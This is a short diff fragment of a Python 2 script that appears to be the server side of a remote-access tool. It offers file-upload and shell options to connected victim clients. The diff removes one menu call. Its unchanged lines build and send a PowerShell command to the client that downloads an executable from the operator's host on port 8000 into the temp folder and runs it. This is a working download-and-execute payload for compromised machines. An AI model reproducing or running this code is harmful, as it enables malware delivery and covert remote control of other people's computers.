@@ -31,7 +31,6 @@ def startSocket(ipaddr, port):
                     menu = raw_input('[u]pload\n[s]hell\n[exit]\n>>')
                     if menu.lower() == "u":
                         fileToUpload = raw_input('File to upload:')
-                        getAndRunMainMenu()
                         FUNCTIONS().DoServe(ipaddr,fileToUpload.split('/')[-1].rstrip('.exe'),os.path.dirname(fileToUpload))
                         print "$a = New-Object System.Net.WebClient;$a.DownloadFile(\"http://" + ipaddr + ':8000/' + fileToUpload.split('/')[-1] + "\",\"Env:TEMP\\temp.exe\");Start-Process \"$Env:TEMP\\temp.exe\""
                         client['clientinstance'].sendall("$a = New-Object System.Net.WebClient;$a.DownloadFile(\"http://" + ipaddr + ':8000/' + fileToUpload.split('/')[-1] + "\",\"$Env:TEMP\\temp.exe\");Start-Process \"$Env:TEMP\\temp.exe\"")
